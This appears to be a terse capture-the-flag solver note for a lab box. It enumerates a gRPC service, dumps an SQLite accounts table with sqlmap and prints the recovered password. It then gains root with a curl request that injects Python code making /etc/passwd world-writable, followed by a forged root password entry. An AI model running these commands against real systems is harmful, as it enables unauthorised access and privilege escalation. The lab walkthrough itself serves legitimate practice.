## Solver
Referensi : https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9

Nmap got output port 50051
Try curl to that port, curl output Received HTTP/0.9 when not allowed
https://stackoverflow.com/questions/59048926/php-curl-received-http-0-9-when-not-allowed
we got about grpc

./grpcurl -plaintext pc.htb:50051 list
./grpcurl -plaintext pc.htb:50051 list SimpleApp

~/go/bin/grpcui -plaintext pc.htb:50051

sqlmap -r post-getInfo.txt --dbms=SQLite -T accounts --dump

sau:HereIsYourPassWord1431

privesc
curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"chmod%20777%20/etc/passwd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'

openssl passwd -1 -salt banua banua
edit /etc/passwd root:x root:$1$banua$xzkGqvbxfOF4USQtALv251
su root
password banua
